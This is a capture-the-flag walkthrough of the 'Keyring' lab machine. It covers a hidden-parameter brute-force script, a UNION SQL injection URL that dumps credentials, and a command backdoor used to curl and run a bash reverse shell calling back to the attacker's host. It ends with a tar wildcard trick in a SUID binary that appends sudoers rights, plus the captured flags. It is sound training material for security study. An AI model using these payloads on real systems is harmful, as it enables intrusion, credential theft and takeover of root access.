**Description:** This is a linux machine, to get the initial acces it was required to enumerate a hidden parameter, which is vulnerable to SQL Injection, through this vulnerability it was possible to retrieve user credentials and thus log in to the web application with high privileges, in this way the backdoor that allowed to execute system commands was discovered. Password reuse and exploitation of a SUID binary, allowed to get root privileges.

## Information Gathering
### Host Discovery

The following ARP scan revealed that the target server is up.

```console
root@kali:/keyring# netdiscover -i vmnet1 172.16.71.1/24
...
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 172.16.71.128   08:00:27:48:ce:85      1      60  PCS Systemtechnik GmbH
```

### Port Scanning

The full TCP port scan found two open ports.

```console
root@kali:/keyring# nmap -n -v -p- --min-rate 300 -Pn 172.16.71.128 -oG nmap/port-scan.txt
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
...
```

### Service Enumeration

Script scanning and version detection discovered OpenSSH 7.6p1 and Apache 2.4.29 on their default ports.

```console
root@kali:/keyring# nmap -n -v -p22,80 -sCV -Pn 172.16.71.128 -oN nmap/service-enum.txt
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)

|_http-title: Site doesn\'t have a title (text/html; charset=UTF-8).

...
```

### Enumeration

There is to sign up a test user to log in to the web application.

Log in with the user created above.

When scanning the web server for web content the **history.php** file was discovered.

```console
root@kali:/keyring# gobuster dir -u http://172.16.71.128/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt 
...
/history.php          (Status: 200) [Size: 31]
...
```

Note that when logging in, **history.php** doesn't display anything.

![](/assets/images/keyring/screenshot-5.png)

When not logging in, **history.php** shows a text.

![](/assets/images/keyring/screenshot-6.png)

There is the possibility that a hidden parameter is taking action here. To find out a python script was written.

```python
#!/usr/bin/env python3

import requests

url = "http://172.16.71.128/login.php"
target_url = "http://172.16.71.128/history.php"
pass_file = open("/opt/seclists/Discovery/Web-Content/burp-parameter-names.txt").read().splitlines()

s = requests.session()


def login():
    
    data = {
            'uname': 'guest',
            'upass': 'guest',
            'btn': ''
            }

    r = s.post(url, data=data)

    if 'welcome' in r.text:
        return True
    else:
        return False


def enum_parameter(p):
    r = s.get(target_url, params={p: 'guest'})
    return r.headers.get('Content-Length')


login()

for p in pass_file:
    if '0' in enum_parameter(p):
        print(f"Parameter invalid: {p:50}", end='\r')
    else:
        print(f"Parameter found: {p:50}")
        break
```

Run the script, it found the **user** parameter.

```console
root@kali:/keyring# python3 penum.py
Parameter found: user 
```

When checking the **user** parameter using as value the user created above, it is observed that it logs the pages visited.

When using the **admin** user as parameter value, a github repository was found.

On the attacking machine clone the repository.

```console
root@kali:/keyring# git clone https://github.com/cyberbot75/keyring
```

Reviewing the source code in **control.php** file, notice that the **system** function is taking a parameter via the GET method.

```console
root@kali:/keyring# cat keyring/html/control.php 
...
  system($_GET['cmdcntr']); //system() function is not safe to use , dont\' forget to remove it in production .
...
```

## Exploitation
### SQL Injection

Testing the **user** parameter in **history.php**, it was discovered that is vulnerable to SQL Injection.

![](/assets/images/keyring/screenshot-9.png)

identifying the number of columns.

![](/assets/images/keyring/screenshot-10.png)

The injected parameter is printable, so it is possible to exploit it through the union technique.

![](/assets/images/keyring/screenshot-11.png)

Reviewing the sorce code in the **login.php** file, it was possible to identify the **details** table and its columns, it is important since it contains the user credentials.

```console
root@kali:/keyring# cat keyring/html/login.php
...
$sql = "select name from details where name='$us' and password='$pa'";
...
```

The query to retrieve the user credentials is:

`http://172.16.71.128/history.php?user=-guest%27%20union%20select%20concat_ws(%27:%27,%20name,%20password)%20from%20details--%20-`

![](/assets/images/keyring/screenshot-12.png)

Log in as user **admin**.

![](/assets/images/keyring/screenshot-14.png)

The **system** function is enable for the **admin** user.

![](/assets/images/keyring/screenshot-15.png)

Write a bash reverse shell to a file.

```console
root@kali:/keyring# echo 'bash -c "bash -i >& /dev/tcp/172.16.71.1/443 0>&1"' > rshell
```

Set up a web server with python.

```console
root@kali:/keyring# python3 -m http.server
```

Start a netcat listener and execute the following instruction:

`http://172.16.71.128/control.php?cmdcntr=curl%20172.16.71.1:8000/rshell%20-o%20/tmp/z;%20sh%20/tmp/z`

Upgrading to a full TTY shell.

```console
root@kali:/keyring# nc -vlnp 443
listening on [any] 443 ...
connect to [172.16.71.1] from (UNKNOWN) [172.16.71.128] 51486
bash: cannot set terminal process group (792): Inappropriate ioctl for device
bash: no job control in this shell
www-data@keyring:/var/www/html$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<ml$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@keyring:/var/www/html$ ^Z
zsh: suspended  nc -vlnp 443
root@kali:/keyring# stty raw -echo;fg
[1]  + continued  nc -vlnp 443

www-data@keyring:/var/www/html$
```

Reusing John's password **Sup3r$S3cr3t$PasSWORD** to escalate privileges.

```console
www-data@keyring:/var/www/html$ su john
Password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

john@keyring:/var/www/html$ cd
john@keyring:~$ grep -oP 'V.*=' user.txt | base64 -d
THM{Bash_1s_Fun_3831342}
```

The user **john** belongs to the lxd group. In the previous writeup I explain how to exploit this misconfiguration.

```console
john@keyring:~$ groups
john adm cdrom sudo dip plugdev lxd lpadmin sambashare
```

The **compress** SUID file was found in john's home directory.

```console
john@keyring:~$ ls -l compress 
-rwsr-xr-x 1 root root 16784 Jun 20  2021 compress
```

Type the following command on the attacking machine to transfer the **compress** binary:

```console
root@kali:/keyring# nc -vlnp 443 > compress
listening on [any] 443 ...
```

Then, on the target server, type the following:

```console
john@keyring:~$ nc 172.16.71.1 443 < compress
```

With the **strings** command it was discovered that the **tar** command is defined to compress in an unsafe way.

```console
root@kali:/keyring# strings compress | grep '/bin/tar'
/bin/tar cf archive.tar *
```

Using ghidra the same was verified.

## Privilege Escalation
### SUID Binary

Now that we know what the binary does it's time to get root. 

The following command writes to the **x** file the instruction to add the user **john** to the sudoers file.

```console
john@keyring:~$ echo "echo 'john ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers" > x
```

Following the [GTFOBins](https://gtfobins.github.io/gtfobins/tar/) instructions, there is to create these files.

```console
john@keyring:~$ echo > "--checkpoint=1"
john@keyring:~$ echo > "--checkpoint-action=exec=sh x"
```

Then, run the binary and execute the **sudo su** command to obtain root.

```console
john@keyring:~$ ./compress 
john@keyring:~$ sudo su
root@keyring:/home/john# whoami
root
```

Read the root flag.

```console
root@keyring:~# grep -oP 'V.*=' root.txt | base64 -d
THM{Keyr1ng_R00t3D_18310567}
```
